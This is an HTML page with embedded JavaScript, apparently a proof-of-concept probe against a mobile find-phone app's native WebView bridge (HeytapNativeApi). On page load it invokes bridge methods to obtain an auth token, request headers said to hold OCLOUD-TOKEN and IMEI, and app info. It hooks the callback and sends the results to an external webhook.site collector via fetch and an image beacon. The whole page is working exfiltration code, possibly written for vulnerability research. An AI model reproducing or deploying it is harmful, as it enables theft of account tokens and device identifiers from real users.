<!doctype html>
<html>
<head>
<meta charset="utf-8">
<title>FMP_PROBE_INIT</title>
</head>
<body>
<h1>FMP Bridge Probe</h1>
<pre id="result" style="word-break:break-all;font-size:12px;">waiting...</pre>
<script>
(function () {
  const COLLECTOR = "https://webhook.site/59dbb195-25a2-4ae1-a6b3-52f1a40cd320";
  const marker = "FMP_" + Date.now();

  function safeString(x) {
    try { return typeof x === "string" ? x : JSON.stringify(x); }
    catch (e) { return String(x); }
  }

  // 把实际数据写进 title + DOM + beacon
  function report(label, data) {
    const s = safeString(data);
    const preview = s.substring(0, 300);

    // 1. title（uiautomator 可读）
    document.title = label + "|" + preview;

    // 2. DOM（uiautomator dump 可读）
    var el = document.getElementById("result");
    if (el) el.textContent += "\n\n[" + label + "]\n" + s;

    // 3. fetch 发全量数据
    var url = COLLECTOR
      + "?m="     + encodeURIComponent(marker)
      + "&label=" + encodeURIComponent(label)
      + "&len="   + encodeURIComponent(String(s.length))
      + "&data="  + encodeURIComponent(s.substring(0, 2000));
    try { fetch(url).catch(function(){}); } catch(e) {}

    // 4. Image beacon 兜底（fetch 被拦截时用这个）
    try { new Image().src = url; } catch(e) {}
  }

  report("PAGE_LOADED", "bridge=" + typeof window.HeytapNativeApi);

  // 拦截异步回调
  window.HeytapJsApi = window.HeytapJsApi || {};
  var oldCb = window.HeytapJsApi.callback;
  window.HeytapJsApi.callback = function(id, result) {
    report("CALLBACK_" + id, result);   // ← 实际数据在这里
    if (typeof oldCb === "function") {
      try { oldCb.apply(this, arguments); } catch(e) {}
    }
  };

  setTimeout(function () {
    if (typeof window.HeytapNativeApi === "undefined") {
      report("ERROR", "HeytapNativeApi not found");
      return;
    }

    // getToken
    try {
      window.HeytapNativeApi.invoke(
        "find_phone_client.getToken", "{}", "cb_token"
      );
    } catch(e) { report("getToken_ERR", String(e)); }

    // getHeaderJson（含 OCLOUD-TOKEN / OCLOUD-IMEI）
    try {
      window.HeytapNativeApi.invoke(
        "find_phone_client.getHeaderJson", "{}", "cb_header"
      );
    } catch(e) { report("getHeaderJson_ERR", String(e)); }

    // getAppInfo
    try {
      window.HeytapNativeApi.invoke(
        "find_phone_client.getAppInfo", "{}", "cb_appinfo"
      );
    } catch(e) { report("getAppInfo_ERR", String(e)); }

  }, 1500);
})();
</script>
</body>
</html>
